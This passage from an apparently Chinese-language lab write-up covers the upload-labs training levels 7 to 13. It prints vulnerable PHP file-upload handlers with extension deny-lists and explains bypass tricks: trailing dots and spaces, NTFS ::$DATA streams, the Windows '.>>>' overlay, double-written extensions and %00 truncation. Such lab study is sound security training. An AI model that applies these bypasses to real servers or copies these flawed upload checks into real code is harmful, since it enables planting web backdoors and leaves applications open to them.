class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里可以发现没有首尾去空的函数，所以我们可以在.php后面加上一个空格即可进行绕过<br>这里需要注意<br>1、windows特性可以自动帮我们去掉尾部空格<br>2、不能直接在文件后加空格参考1，所以需要抓包进行添加空格<br><img src="/img/upload-labs3.png" srcset="/img/loading.gif" lazyload></p><h3 id="windows系统特征绕过攻击-labs-7"><a href="#windows系统特征绕过攻击-labs-7" class="headerlink" title="windows系统特征绕过攻击(labs-7)"></a><strong>windows系统特征绕过攻击(labs-7)</strong></h3><p><strong>源码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//首尾去空</span><br>        <br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file_name</span>;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件类型不允许上传！&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里没有删除点的函数由于windows系统特征会自动删除末尾的’.’，这里类似于空格绕过</p><h3 id="DATA绕过-labs-8"><a href="#DATA绕过-labs-8" class="headerlink" title="::$DATA绕过(labs-8)"></a><strong>::$DATA绕过(labs-8)</strong></h3><p><strong>源码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">deldot</span>(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//删除文件名末尾的点</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//首尾去空</span><br>        <br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>).<span class="hljs-variable">$file_ext</span>;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件类型不允许上传！&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>后缀名没有对::$DATA 进行判断，利用 windows 系统 NTFS 特征可以绕过上传<br>这里提一嘴，1.php:$DATA是创建1.php空文件<br>1.php::$DATA是创建空文件并写入</p><h3 id="利用-windows-环境的叠加特征绕过上传-labs-9"><a href="#利用-windows-环境的叠加特征绕过上传-labs-9" class="headerlink" title="利用 windows 环境的叠加特征绕过上传(labs-9)"></a><strong>利用 windows 环境的叠加特征绕过上传(labs-9)</strong></h3><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">deldot</span>(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//删除文件名末尾的点</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//首尾去空</span><br>        <br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file_name</span>;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件类型不允许上传！&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span><br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在 windwos 中如果上传文件名 moonsec.php:.jpg 的时候，会在目录下生产空白的<br>文件名 moonsec.php<br>再利用 php 和 windows 环境的叠加属性，<br>以下符号在正则匹配时相等<br>双引号” 等于 点号. 大于符号&gt; 等于 问号?<br>小于符号&lt; 等于 星号*<br>文件名.&lt;或文件名.&lt;&lt;&lt;或文件名.&gt;&gt;&gt;或文件名.&gt;&gt;&lt;空文件名</p><p><strong>操作流程</strong><br>首先抓包上传 a.php:.jpg 上传会在目录里生成 a.php 空白文件，接着再次提交把a.php 改成 a.&gt;&gt;&gt;,即可在a.php写入内容</p><h3 id="双写后缀上传-labs-10"><a href="#双写后缀上传-labs-10" class="headerlink" title="双写后缀上传(labs-10)"></a><strong>双写后缀上传(labs-10)</strong></h3><p><strong>源码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;php&quot;</span>,<span class="hljs-string">&quot;php5&quot;</span>,<span class="hljs-string">&quot;php4&quot;</span>,<span class="hljs-string">&quot;php3&quot;</span>,<span class="hljs-string">&quot;php2&quot;</span>,<span class="hljs-string">&quot;html&quot;</span>,<span class="hljs-string">&quot;htm&quot;</span>,<span class="hljs-string">&quot;phtml&quot;</span>,<span class="hljs-string">&quot;pht&quot;</span>,<span class="hljs-string">&quot;jsp&quot;</span>,<span class="hljs-string">&quot;jspa&quot;</span>,<span class="hljs-string">&quot;jspx&quot;</span>,<span class="hljs-string">&quot;jsw&quot;</span>,<span class="hljs-string">&quot;jsv&quot;</span>,<span class="hljs-string">&quot;jspf&quot;</span>,<span class="hljs-string">&quot;jtml&quot;</span>,<span class="hljs-string">&quot;asp&quot;</span>,<span class="hljs-string">&quot;aspx&quot;</span>,<span class="hljs-string">&quot;asa&quot;</span>,<span class="hljs-string">&quot;asax&quot;</span>,<span class="hljs-string">&quot;ascx&quot;</span>,<span class="hljs-string">&quot;ashx&quot;</span>,<span class="hljs-string">&quot;asmx&quot;</span>,<span class="hljs-string">&quot;cer&quot;</span>,<span class="hljs-string">&quot;swf&quot;</span>,<span class="hljs-string">&quot;htaccess&quot;</span>);<br><br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-variable">$deny_ext</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//过滤掉黑名单</span><br>        <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>        <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file_name</span>;        <br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>            <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里只需要简单的双写即可</p><h3 id="目录可控-00-截断绕过上传-labs-11，labs-12"><a href="#目录可控-00-截断绕过上传-labs-11，labs-12" class="headerlink" title="目录可控%00 截断绕过上传(labs-11，labs-12)"></a><strong>目录可控%00 截断绕过上传(labs-11，labs-12)</strong></h3><p><strong>源码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php">码<br><br><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$ext_arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>);<br>    <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>],<span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>],<span class="hljs-string">&quot;.&quot;</span>)+<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>,<span class="hljs-variable">$ext_arr</span>))&#123;<br>        <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>        <span class="hljs-variable">$img_path</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;save_path&#x27;</span>].<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$file_ext</span>;<br><span class="hljs-comment">//这段代码同样是白名单限制后缀名，$_POST[&#x27;save_path&#x27;]是接收客户端提交的值，客户端可任意修改。所以会产生安全漏洞。</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>,<span class="hljs-variable">$img_path</span>))&#123;<br>            <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>上传参数可控<br>当 gpc 关闭的情况下，可以用%00 对目录或者文件名进行截断。<br>php 版本小于 5.3.4<br>首先截断攻击，抓包上传将%00 自动截断后门内容。<br>例如 1.php%00.1.jpg 变成 1.php</p><p><strong>目录可控 POST 绕过上传</strong><br>上面是 GET 请求的，可以直接在 url 输入%00 即可截断，但是在 post 下直接注入%00 是不行的，需要把%00 解码变成空白符，截断才有效。才能把目录截断成文件名。<br><img src="/img/upload-labs4.png" srcset="/img/loading.gif" lazyload></p><h3 id="文件头检测绕过上传-labs-13"><a href="#文件头检测绕过上传-labs-13" class="headerlink" title="文件头检测绕过上传(labs-13)"></a><strong>文件头检测绕过上传(labs-13)</strong></h3><p><strong>源码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 